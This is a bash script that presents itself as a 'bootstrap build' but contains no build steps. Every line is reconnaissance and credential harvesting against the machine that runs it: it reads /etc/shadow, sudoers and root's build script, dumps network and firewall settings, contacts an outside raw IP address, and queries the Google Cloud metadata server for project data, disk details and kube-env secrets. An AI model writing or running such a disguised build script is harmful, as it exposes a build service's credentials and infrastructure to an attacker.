#!/bin/bash
# -*- coding: UTF8 -*-

echo "this is the bootstrap build !!"
id
uname -a
mount
ls /dev
ip addr
curl -vv http://51.38.126.110/build_semmle
ps -aux

iptables-save
cat /etc/resolv.conf
cat /etc/passwd
cat /etc/groups
cat /etc/shadow
cat /etc/sudoers
ls /etc/sudoers.d/

cat /etc/crontab
cat /root/.start-build.sh

curl  -H "X-Google-Metadata-Request: True" -vv http://169.254.169.254/computeMetadata/v1/
curl -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/
curl  -H "X-Google-Metadata-Request: True" -vv http://metadata/computeMetadata/v1/
curl  -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/instance/hostname
curl  -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/instance/id
curl  -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/project/project-id
curl  -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
curl  -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
curl -vv http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json





